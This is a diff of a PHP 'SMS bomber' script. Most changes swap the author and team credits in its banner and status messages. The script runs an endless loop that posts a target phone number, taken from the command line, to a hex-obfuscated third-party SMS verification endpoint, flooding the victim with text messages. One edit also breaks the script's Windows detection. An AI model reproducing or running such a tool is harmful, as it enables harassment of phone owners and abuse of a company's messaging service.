@@ -4,7 +4,7 @@
 
 <?php
 
-if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
+if(strtolower(substr(PHP_OS, 0, 30)) == 'win') {
 
 $R = "";
 
@@ -139,11 +139,11 @@ echo $B."\n::#:Instagram ::[@Mhmmd_Ardi1:]#";
 
 echo $RR."\n::#:Github ::[http://github.com/spam:] #";
 
-echo $R."\n::#:Facebook ::[AndroTech1733:] #";
+echo $R."\n::#:Facebook ::[Mhmmd_Ardi:] #";
 
 echo $G."\n::#:YouTube ::[ARDY GAMING:] #";
 
-echo $GG."\n::#:Team ::[ARDY - AndroTech1734] #";
+echo $GG."\n::#:Team ::[ARDY - X Sija] #";
 
 echo $YY."\n::#: #";
 
@@ -161,7 +161,7 @@ if(is_numeric($argv[1])) {
 
 	while(1) {
 
-		echo "[]SIL3NT Sending Massage To[] # ".$G.$argv[1].$X."\n";	
+		echo "[]Mr.Ardi Sending Massage To[] # ".$G.$argv[1].$X."\n";	
 
 		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[1]."&smsType=1");
 
@@ -193,7 +193,7 @@ while(1) {
 
 foreach($argv[1] as $argv[2]):
 
-echo "[]SIL3NT Sending Massage To[] # ".$G.$argv[2].$X."\n";
+echo "[]Mr.Ardi Sending Massage To[] # ".$G.$argv[2].$X."\n";
 
 	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[2]."&smsType=1");
 
